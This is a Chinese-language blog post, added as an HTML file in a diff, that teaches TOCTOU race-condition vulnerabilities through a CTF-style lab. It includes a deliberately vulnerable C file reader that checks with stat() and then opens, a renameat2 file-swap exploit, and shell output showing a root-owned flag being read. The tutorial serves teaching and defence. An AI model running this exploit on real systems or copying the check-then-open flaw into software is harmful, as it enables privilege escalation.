@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        puzzzz
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            条件竞争漏洞
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <h2 id="条件竞争漏洞-TOCTOU-Race-Condition"><a href="#条件竞争漏洞-TOCTOU-Race-Condition" class="headerlink" title="条件竞争漏洞(TOCTOU Race Condition)"></a>条件竞争漏洞(TOCTOU Race Condition)</h2><h4 id="1、原理"><a href="#1、原理" class="headerlink" title="1、原理"></a>1、原理</h4><ul>
+<li>多个线程同时访问同一个代码、变量、文件等没有进行锁操作或同步操作的场景中。</li>
+</ul>
+<h4 id="2、危害"><a href="#2、危害" class="headerlink" title="2、危害"></a>2、危害</h4><ul>
+<li> 绕过数量限制</li>
+<li> 文件上传漏洞</li>
+<li> DOS攻击</li>
+<li> 权限提升</li>
+</ul>
+<h4 id="3、触发条件"><a href="#3、触发条件" class="headerlink" title="3、触发条件"></a>3、触发条件</h4><ul>
+<li>两个以上的并发执行流</li>
+<li>并发流访问同一对象</li>
+<li>至少有一个控制流会改变竞争对象的状态</li>
+</ul>
+<p> <img src="./../../themes/geek/imgs/time_interval.png" alt="time_interval"></p>
+<p>程序首先执行action1，然后执行action2，正常流程是程序在执行action2时，action1所产生的条件仍然是满足的。<br>但是由于程序的并发性，攻击者很有可能可以在<strong>action2 执行之前的这个短暂的时间差中破坏 action1 所产生的条件</strong>。这时候攻击者的操作与 action2 产生了条件竞争，所以可能会影响程序的执行效果。</p>
+<h4 id="4、案例"><a href="#4、案例" class="headerlink" title="4、案例"></a>4、案例</h4><p><strong>TOCTOU</strong> (Time-of-check Time-of-use) 指的是程序在使用资源（变量，内存，文件）前会对进行检查，但是在程序使用对应的资源前，该资源却被修改了。</p>
+<p> <img src="./../../themes/geek/imgs/toctou.png" alt="toctou"></p>
+<h3 id="Race-Condition-Enabling-Link-Following"><a href="#Race-Condition-Enabling-Link-Following" class="headerlink" title="Race Condition Enabling Link Following"></a>Race Condition Enabling Link Following</h3><p><em>Linux 中提供了两种对于文件的命名方式</em></p>
+<ul>
+<li><em>文件路径名</em></li>
+<li><em>文件描述符</em></li>
+</ul>
+<p>但是，将这两种命名解析到相应对象上的方式有所不同</p>
+<ul>
+<li><strong>文件路径名</strong>在解析的时候是通过传入的路径（文件名，硬链接，软连接）间接解析的，其传入的参数并不是相应文件的真实地址。  </li>
+<li><strong>文件描述符</strong>通过访问直接指向文件的指针来解析。</li>
+</ul>
+<p>正是由于间接性，产生了上面我们所说的时间差。</p>
+<p>以下面的代码为例子，程序在访问某个文件之前，会检查是否存在，判断文件的权限，之后会打开文件然后执行操作。但是如果在<strong>检查之后，真正使用文件之前</strong>，攻击者使用另一个程序(并发)将文件名替换，那么程序将访问错误的文件，就有可能造成提权，脏牛漏洞差不多也是这个原理。</p>
+<p><em><strong>readfile.c</strong></em></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    FILE  *fd;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">20</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">stat_data</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (stat(argv[<span class="number">1</span>],&amp;stat_data)&lt;<span class="number">0</span>) &#123;           <span class="comment">//获取文件信息</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;获取失败.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stat_data.st_uid==<span class="number">0</span>) &#123;                  <span class="comment">//验证权限</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;无权限\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        fd=fopen(argv[<span class="number">1</span>],<span class="string">&quot;r&quot;</span>);                  <span class="comment">//操作文件</span></span><br><span class="line">        <span class="keyword">while</span> (fgets(str,<span class="number">20</span>,fd)!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里用的是<code>stat</code>函数，通过文件名去获取文件的<code>stat</code>结构，然后再判断文件的所有者，如果所有者不是<code>root</code>的话就打开它，这里从获取文件<code>stat</code>到读取并不是一步就能完成的，这两个操作有一定的时间差。</p>
+<p>现在/tmp目录下存在三个文件  </p>
+<ul>
+<li><strong>user.tmp</strong>  空文件</li>
+<li><strong>flag</strong>      软连接</li>
+<li><strong>readfile</strong>  可执行文件</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tmp<span class="comment"># ls -li user.tmp flag readfile</span></span><br><span class="line">2228722 lrwxrwxrwx 1 user user    19 4月  10 09:47 flag -&gt; /RaceCondition/flag</span><br><span class="line">2228723 -rwxr-xr-x 1 root root 16976 4月  12 14:54 readfile</span><br><span class="line">2228721 -rw-r--r-- 1 user user     0 4月  10 09:39 user.tmp</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/RaceCondition<span class="comment"># ls -li flag</span></span><br><span class="line">4194310 -rw-r--r-- 1 root root 12 4月   9 11:34 flag</span><br></pre></td></tr></table></figure>
+
+<p>假设现在传入的是<code>/tmp/user.tmp</code>文件<code>（st_uid=1001）</code>，它的所有者是 <code>user(uid=1001)</code>，在执行完 <code>stat(argv[1], &amp;stat_data)</code> 之后的那一个瞬间，我用另一个程序(并发)把 <code>/tmp/flag</code> （ <code>/flag</code> 的软链接 <code>st_uid=1001</code>） 重命名为 <code>/tmp/user.tmp</code> 这样的话，在 <code>if</code> 的检测中检查的是原本的那个 <code>user.tmp</code> 文件的 <code>st_uid</code>，而走到 <code>fopen</code> 的时候 <code>argv[1]</code> 虽然也是 <code>/tmp/user.tmp</code> 但是打开的却是原本的 <code>/tmp/flag</code> 文件，而这个文件是 <code>/flag</code> 的软链接，这样我们就能读出 <code>/flag</code> 的内容</p>
+<p>这个需要快速操作，才能通过<code>readfile</code>这个程序读取到 <code>/RaceCondition/flag</code> （因为我们是普通用户不能直接读取 <code>/RaceCondition/flag</code> 文件)</p>
+<p><em><strong>exp</strong></em></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// source https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    syscall(SYS_renameat2, AT_FDCWD, argv[<span class="number">1</span>], AT_FDCWD, argv[<span class="number">2</span>], RENAME_EXCHANGE);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个程序实现交换文件名的功能</p>
+<h4 id="5、演示"><a href="#5、演示" class="headerlink" title="5、演示"></a>5、演示</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/RaceCondition<span class="comment"># ./exp /tmp/user.tmp /tmp/flag</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>执行exp后两个文件的名字一直在交换</strong></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tmp<span class="comment"># ls -li user.tmp flag</span></span><br><span class="line">2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 flag -&gt; /RaceCondition/flag</span><br><span class="line">2228721 -rw-r--r-- 1 user user  0 4月  10 09:39 user.tmp</span><br><span class="line"></span><br><span class="line">root@kali:/tmp<span class="comment"># ls -li user.tmp flag</span></span><br><span class="line">ls: 无法读取符号链接<span class="string">&#x27;user.tmp&#x27;</span>: 无效的参数</span><br><span class="line">ls: 无法读取符号链接<span class="string">&#x27;flag&#x27;</span>: 无效的参数</span><br><span class="line">2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 flag</span><br><span class="line">2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 user.tmp</span><br><span class="line"></span><br><span class="line">root@kali:/tmp<span class="comment"># ls -li user.tmp flag</span></span><br><span class="line">2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 flag -&gt; /RaceCondition/flag</span><br><span class="line">2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 user.tmp -&gt; /RaceCondition/flag</span><br><span class="line"></span><br><span class="line">root@kali:/tmp<span class="comment"># ls -li user.tmp flag</span></span><br><span class="line">ls: 无法读取符号链接<span class="string">&#x27;flag&#x27;</span>: 无效的参数</span><br><span class="line">2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 flag</span><br><span class="line">2228721 -rw-r--r-- 1 user user  0 4月  10 09:39 user.tmp</span><br><span class="line"></span><br><span class="line">root@kali:/tmp<span class="comment"># ls -li user.tmp flag</span></span><br><span class="line">ls: flag: 权限不够</span><br><span class="line">2228721 -rw-r--r-- 1 user user  0 4月  10 09:39 flag</span><br><span class="line">2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 user.tmp -&gt; /RaceCondition/flag</span><br><span class="line"></span><br><span class="line">root@kali:/tmp<span class="comment"># ls -li user.tmp flag</span></span><br><span class="line">ls: 无法读取符号链接<span class="string">&#x27;flag&#x27;</span>: 无效的参数</span><br><span class="line">2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 flag</span><br><span class="line">2228722 lrwxrwxrwx 1 user user 19 4月  10 09:47 user.tmp -&gt; /RaceCondition/flag</span><br><span class="line"></span><br><span class="line">root@kali:/tmp<span class="comment"># ls -li user.tmp flag</span></span><br><span class="line">ls: flag: 权限不够</span><br><span class="line">2228721 -rw-r--r-- 1 user user 0 4月  10 09:39 flag</span><br><span class="line">2228721 -rw-r--r-- 1 user user 0 4月  10 09:39 user.tmp</span><br></pre></td></tr></table></figure>
+
+<p>在文件状态一直在改变的瞬间执行<code>readfile</code>程序去读取<code>flag</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./readfile /tmp/flag</span></span><br><span class="line">无权限</span><br><span class="line"><span class="meta">$</span><span class="bash"> ./readfile /tmp/flag</span></span><br><span class="line">无权限</span><br><span class="line"><span class="meta">$</span><span class="bash"> ./readfile /tmp/flag</span></span><br><span class="line">无权限</span><br><span class="line"><span class="meta">$</span><span class="bash"> ./readfile /tmp/flag</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./readfile /tmp/flag</span></span><br><span class="line">flag&#123;66666&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第5次执行的时候成功读取root用户文件内容</p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/race-condition/introduction/#cwe-363-race-condition-enabling-link-following">https://ctf-wiki.org/pwn/linux/race-condition/introduction/#cwe-363-race-condition-enabling-link-following</a></p>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/LiveOverflow/590edaf5cf3adeea31c73e303692dec0">https://gist.github.com/LiveOverflow/590edaf5cf3adeea31c73e303692dec0</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=1hScemFvnzw">https://www.youtube.com/watch?v=1hScemFvnzw</a></p>
+
+    </div>
+
+    
+
+        <div id="vcomments"></div>
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+        <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label>
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="3yI7IuxWNK3XDlWdwgd50td3-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="0vh3oYn5EDtd2fltAfwelaV8">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+
+<script src="/libs/clicksocialvalue.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
